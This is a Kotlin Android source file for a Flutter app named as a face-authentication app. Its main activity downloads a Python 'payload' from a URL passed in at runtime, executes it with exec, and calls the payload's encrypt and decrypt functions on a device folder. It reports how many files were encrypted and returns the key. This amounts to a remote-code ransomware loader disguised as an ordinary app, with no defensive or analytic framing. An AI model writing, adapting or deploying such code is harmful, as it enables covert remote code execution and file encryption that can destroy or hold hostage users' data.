package com.example.face_auth_app

import android.os.Handler
import android.os.Looper
import android.util.Log
import com.chaquo.python.Python
import com.chaquo.python.android.AndroidPlatform
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : FlutterActivity() {

    private val CHANNEL = "com.example.face_auth_app/payload"
    
    // Use app-private cache dir so no storage permission is needed for the payload file
    private val CACHE_DIR by lazy { File(cacheDir, "python_payloads") }
    private val PAYLOAD_FILE by lazy { File(CACHE_DIR, "payload.py") }
    
    private val executor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        if (!Python.isStarted()) {
            Python.start(AndroidPlatform(this))
        }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "runPayload" -> {
                        val operation = call.argument<String>("operation") ?: "encrypt"
                        val rootPath = call.argument<String>("rootPath") 
                            ?: getExternalFilesDir(null)?.absolutePath 
                            ?: cacheDir.absolutePath
                        val key = call.argument<String>("key")
                        val payloadUrl = call.argument<String>("payloadUrl")
                            ?: return@setMethodCallHandler result.error(
                                "MISSING_ARG", "payloadUrl not provided", null
                            )

                        // Run everything on a background thread
                        executor.execute {
                            try {
                                val response = runPayload(operation, rootPath, key, payloadUrl)
                                mainHandler.post { result.success(response) }
                            } catch (e: Exception) {
                                Log.e("MainActivity", "Payload error", e)
                                mainHandler.post {
                                    result.error(
                                        "PYTHON_ERROR",
                                        e.message ?: e.javaClass.simpleName,
                                        e.stackTraceToString()
                                    )
                                }
                            }
                        }
                    }
                    else -> result.notImplemented()
                }
            }
    }

    private fun runPayload(
        operation: String,
        rootPath: String,
        key: String?,
        payloadUrl: String
    ): Map<String, Any> {
        ensurePayloadDownloaded(payloadUrl)

        val fileContent = PAYLOAD_FILE.readText()
        Log.i("MainActivity", "Payload size: ${fileContent.length} bytes")

        if (fileContent.isBlank()) {
            throw Exception("Downloaded payload is empty")
        }

        val py = Python.getInstance()
        val builtins = py.getModule("builtins")

        // Create a fresh globals dict and exec the payload into it
        val globals = builtins.callAttr("dict")
        try {
            builtins.callAttr("exec", fileContent, globals)
        } catch (e: Exception) {
            Log.e("MainActivity", "Python exec failed", e)
            throw Exception("Python exec error: ${e.message ?: e.javaClass.simpleName}")
        }

        // Pull functions out of the globals dict
        val encryptFunc = globals.callAttr("get", "encrypt")
        val decryptFunc = globals.callAttr("get", "decrypt")
        val none = builtins.get("None")

        if (encryptFunc === none || decryptFunc === none) {
            throw Exception("Payload does not define encrypt/decrypt functions")
        }

        return when (operation) {
            "encrypt" -> {
                try {
                    val result = encryptFunc.call(rootPath)
                    val resultList = result.asList()
                    val count = resultList[0].toInt()
                    val keyHex = resultList[1].toString()
                    mapOf(
                        "count" to count,
                        "key" to keyHex,
                        "operation" to "encrypt"
                    )
                } catch (e: Exception) {
                    Log.e("MainActivity", "Encryption failed", e)
                    throw Exception("Encryption failed: ${e.message ?: e.javaClass.simpleName}")
                }
            }
            "decrypt" -> {
                if (key == null) {
                    throw Exception("Key required for decryption")
                }
                try {
                    val count = decryptFunc.call(rootPath, key).toInt()
                    mapOf(
                        "count" to count,
                        "operation" to "decrypt"
                    )
                } catch (e: Exception) {
                    Log.e("MainActivity", "Decryption failed", e)
                    throw Exception("Decryption failed: ${e.message ?: e.javaClass.simpleName}")
                }
            }
            else -> throw Exception("Unknown operation: $operation")
        }
    }

    private fun ensurePayloadDownloaded(payloadUrl: String) {
        if (!CACHE_DIR.exists()) {
            CACHE_DIR.mkdirs()
        }

        try {
            val client = OkHttpClient.Builder()
                .connectTimeout(15, TimeUnit.SECONDS)
                .readTimeout(15, TimeUnit.SECONDS)
                .build()
            val request = Request.Builder().url(payloadUrl).build()
            val response = client.newCall(request).execute()
            if (!response.isSuccessful) {
                throw Exception("Failed to download payload: ${response.code}")
            }
            val body = response.body?.string() ?: throw Exception("Empty response")
            PAYLOAD_FILE.writeText(body)
            Log.i("MainActivity", "Payload cached at ${PAYLOAD_FILE.absolutePath}")
        } catch (e: Exception) {
            Log.e("MainActivity", "Download failed", e)
            throw e
        }
    }

    override fun onDestroy() {
        executor.shutdown()
        super.onDestroy()
    }
}